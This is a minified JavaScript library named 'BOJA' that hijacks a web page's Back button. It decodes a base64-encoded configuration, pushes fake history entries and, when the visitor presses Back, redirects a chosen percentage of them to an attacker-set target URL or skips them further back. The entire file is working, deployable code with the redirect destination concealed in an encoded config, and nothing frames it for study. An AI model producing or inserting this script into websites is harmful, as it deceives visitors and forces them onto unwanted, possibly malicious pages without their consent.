!function(t,e){t.BOJA=e(t.BOJA)}(this,function(){"use strict";var t={},e=window,o=document,r={};r.code="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",r.decode=function(t,e){e="undefined"==typeof e?!1:e;var o,n,a,i,s,c,f,d,h,p,g=[],u=r.code;p=e?Utf8.decode(t):t;for(var m=0;m<p.length;m+=4)i=u.indexOf(p.charAt(m)),s=u.indexOf(p.charAt(m+1)),c=u.indexOf(p.charAt(m+2)),f=u.indexOf(p.charAt(m+3)),d=i<<18|s<<12|c<<6|f,o=d>>>16&255,n=d>>>8&255,a=255&d,g[m/4]=String.fromCharCode(o,n,a),64==f&&(g[m/4]=String.fromCharCode(o,n)),64==c&&(g[m/4]=String.fromCharCode(o));return h=g.join(""),e?Utf8.decode(h):h};var n=function(t,e,o){t.addEventListener?t.addEventListener(e,o):t.attachEvent("on"+e,function(){o.call(t)})},a=function(t){return t.state&&t.state.hasOwnProperty("cfg")&&(t.state.cfg.target&&parseInt(sessionStorage.getItem("boja_time"))+1e3*parseInt(t.state.cfg.timeout)>=(new Date).getTime()&&Math.floor(100*Math.random()+1)<=t.state.cfg.percent?window.location.href=t.state.cfg.target:(window.history.back(),window.history.back())),!1};return n(e,"popstate",a),t.init=function(e){var n=!1;try{n=JSON.parse(r.decode(e))}catch(a){return}n.repo=n.hasOwnProperty("repo")?parseInt(n.repo):1,n.timeout=n.hasOwnProperty("timeout")?parseInt(n.timeout):1,n.target=n.hasOwnProperty("target")?n.target:!1,n.percent=n.hasOwnProperty("percent")?n.percent:100;var i=window.location.hash;if("object"==typeof history&&"function"==typeof history.pushState&&"object"==typeof sessionStorage&&"function"==typeof sessionStorage.getItem){if(sessionStorage.getItem("boja_time")){if(1==n.repo)return t}else sessionStorage.setItem("boja_time",(new Date).getTime());history.pushState({cfg:n},o.title,i),history.pushState({cfg:n},o.title,i)}},t});